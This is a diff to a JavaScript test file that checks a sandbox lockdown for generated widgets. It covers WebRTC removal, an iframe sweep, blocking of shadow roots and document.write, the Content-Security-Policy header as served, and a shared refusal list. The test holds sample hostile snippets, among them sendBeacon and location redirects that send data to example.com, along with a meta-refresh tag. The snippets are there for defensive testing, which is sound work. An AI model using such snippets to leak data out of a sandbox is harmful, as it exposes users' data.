@@ -31,6 +31,7 @@ import { mkdtempSync, rmSync, readFileSync, mkdirSync } from 'node:fs';
 import { join, resolve, dirname } from 'node:path';
 import v8 from 'node:v8';
 import vm from 'node:vm';
+import { get } from 'node:http';
 
 const require = createRequire(import.meta.url);
 const esbuild = require('esbuild');
@@ -675,17 +676,34 @@ console.log('\nleaving the frame');
     const enforced = appSrc.slice(appSrc.indexOf('const CSP_ENFORCED = ['), appSrc.indexOf("].join('; ');", appSrc.indexOf('const CSP_ENFORCED = [')));
     check('the ENFORCED header limits frames to this app: frame-src \'self\' blob:', enforced.includes(`"frame-src 'self' blob:"`), enforced);
 
-    // 2. The first script takes WebRTC away, and nothing after it gets it back.
-    const g = { RTCPeerConnection: function RTCPeerConnection() {}, webkitRTCPeerConnection: function () {}, RTCDataChannel: function () {} };
-    g.window = g;
-    vm.createContext(g);
-    vm.runInContext(LOCKDOWN, g);
-    vm.runInContext(`try { window.RTCPeerConnection = function () {}; } catch (e) {}
+    // 2. The first script takes WebRTC away, and nothing after it gets it back;
+    // nor can the code start a nested document, which would hold fresh copies.
+    const box = new JSDOM('<!doctype html><html><head></head><body></body></html>', { runScripts: 'outside-only', beforeParse(win) {
+        win.RTCPeerConnection = function RTCPeerConnection() {};
+        win.webkitRTCPeerConnection = function () {};
+        win.RTCDataChannel = function () {};
+    } }).window;
+    box.eval(LOCKDOWN);
+    box.eval(`try { window.RTCPeerConnection = function () {}; } catch (e) {}
         try { delete window.RTCPeerConnection; } catch (e) {}
         try { Object.defineProperty(window, 'RTCPeerConnection', { value: function () {} }); } catch (e) {}
-        try { webkitRTCPeerConnection = function () {}; } catch (e) {}`, g);
+        try { webkitRTCPeerConnection = function () {}; } catch (e) {}`);
     check('after the lockdown no peer connection can be made, put back or redefined',
-        vm.runInContext('typeof RTCPeerConnection === "undefined" && typeof webkitRTCPeerConnection === "undefined" && typeof RTCDataChannel === "undefined"', g));
+        box.eval('typeof RTCPeerConnection === "undefined" && typeof webkitRTCPeerConnection === "undefined" && typeof RTCDataChannel === "undefined"'));
+    // The code first breaks what the sweep would call, then writes its frames.
+    box.eval(`Element.prototype.remove = function () {}; Element.prototype.querySelectorAll = function () { return []; };
+        Object.defineProperty(NodeList.prototype, 'length', { get() { return 0; } });
+        var f = document.createElement('iframe'); f.srcdoc = '<p>x</p>'; document.body.appendChild(f);
+        var d = document.createElement('div'); d.innerHTML = '<span><iframe srcdoc="x"></iframe><object></object><embed></span>'; document.body.appendChild(d);`);
+    await new Promise(r => setTimeout(r, 0));
+    check('a frame the code writes, alone or inside markup, is gone before it loads — whatever it did to the DOM methods first',
+        box.document.body.innerHTML.search(/<(?:iframe|object|embed)\b/i) === -1, box.document.body.innerHTML.slice(0, 200));
+    const shut = (code) => { try { box.eval(code); return false; } catch { return true; } };
+    check('…and the ways around the sweep are shut: a shadow root, document.write/open',
+        shut(`document.body.attachShadow({ mode: 'open' })`) && shut(`document.write('<iframe srcdoc=x></iframe>')`) && shut(`document.open()`));
+    box.eval(`try { Element.prototype.attachShadow = HTMLElement.prototype.click; } catch (e) {}
+        try { Object.defineProperty(document, 'write', { value: function () {} }); } catch (e) {}`);
+    check('…and stay shut', shut(`document.body.attachShadow({ mode: 'open' })`) && shut(`document.write('x')`));
     const p5Src = readFileSync(join(root, 'src/components/visuals/renderP5.ts'), 'utf8');
     check('a p5 sketch\'s document runs the same lockdown first, right after its CSP',
         /\$\{sketchCsp\(\)\}\r?\n<script>\$\{SANDBOX_LOCKDOWN_JS\}<\\\/script>/.test(p5Src));
@@ -693,11 +711,24 @@ console.log('\nleaving the frame');
         p5Src.indexOf('leavesTheFrame(sketch)') !== -1 && p5Src.indexOf('leavesTheFrame(sketch)') < p5Src.indexOf('await probeSketch('));
 
     // 3. Code that names a way out goes back to be fixed: the client's check
-    // (p5) and the server's (widget builds) refuse the same things.
+    // (p5) and the server's (widget builds) refuse the same things, from ONE
+    // list (server/leavingFrame.js).
+    const aiSrc = readFileSync(aiPath, 'utf8');
+    check('the server\'s widget vetoes are that list, not a copy of it',
+        /\.\.\.LEAVING_FRAME,/.test(aiSrc) && /import \{ LEAVING_FRAME \} from '\.\/leavingFrame\.js';/.test(aiSrc)
+        && /export \{ leavesTheFrame \} from '\.\.\/\.\.\/\.\.\/server\/leavingFrame\.js';/.test(readFileSync(join(root, 'src/components/visuals/sandboxLockdown.ts'), 'utf8')));
     const scratchDb = mkdtempSync(join(cache, 'widget-csp-ai-'));
     process.env.DB_PATH = join(scratchDb, 'gate.db');
     process.env.VAULT_ROOT = join(scratchDb, 'vault');
     const { finalizeWidgetHtml } = await import(pathToFileURL(aiPath).href);
+    // The header as served, not only as written (scratch library, set above).
+    const { createApp } = await import(pathToFileURL(join(root, 'server/app.js')).href);
+    const srv = createApp().listen(0, '127.0.0.1');
+    await new Promise(r => srv.once('listening', r));
+    const served = await new Promise((ok, no) => get({ host: '127.0.0.1', port: srv.address().port, path: '/api/build', agent: false },
+        r => { r.resume(); ok(String(r.headers['content-security-policy'] || '')); }).on('error', no));
+    await new Promise(r => srv.close(r));
+    check('…and the app SENDS it', served.split(';').map(s => s.trim()).includes("frame-src 'self' blob:"), served);
     const asBuild = (js) => `<!doctype html><html><head></head><body><div id="w">x</div><script>${js}</script></body></html>`;
     const serverRefuses = (js) => { try { finalizeWidgetHtml(asBuild(js)); return false; } catch { return true; } };
     const hostile = [
@@ -710,6 +741,10 @@ console.log('\nleaving the frame');
         "new webkitRTCPeerConnection({});",
         "navigator.sendBeacon('https://example.com/', data);",
         "window.open('https://example.com/');",
+        "location = 'https://example.com/?d=' + data;",
+        "var f = document.createElement('iframe'); f.srcdoc = page;",
+        "var f = createElement('iframe');",
+        "host.attachShadow({ mode: 'open' }).innerHTML = markup;",
     ];
     const benign = [
         "var location = { x: 3, y: 4 }; draw(location.x);",
@@ -717,7 +752,16 @@ console.log('\nleaving the frame');
         "function open(panel) { panel.hidden = false; } open(menu);",
         "dialog.open = true; parent.postMessage({ type: 'size' }, '*');",
         "var relocation = 1; body.location = 2;",
+        "const location = 'Paris'; let a = location == 'Paris';",
+        "var p = createElement('p'); var c = createElement('canvas');",
     ];
+    const markupOnly = [
+        '<iframe srcdoc="x"></iframe>', '<IFRAME src="about:blank">', '<object data="x"></object>', '<embed src="x">',
+        '<meta http-equiv="refresh" content="0;url=https://example.com/">',
+    ];
+    for (const m of markupOnly) {
+        check(`a widget build carrying ${m.slice(0, 40)} is refused`, (() => { try { finalizeWidgetHtml(asBuild('1;').replace('<body>', `<body>${m}`)); return false; } catch { return true; } })());
+    }
     for (const js of hostile) {
         check(`refused on both sides: ${js.slice(0, 60)}`, !!leavesTheFrame(js) && serverRefuses(js), `client ${leavesTheFrame(js)}, server ${serverRefuses(js)}`);
     }
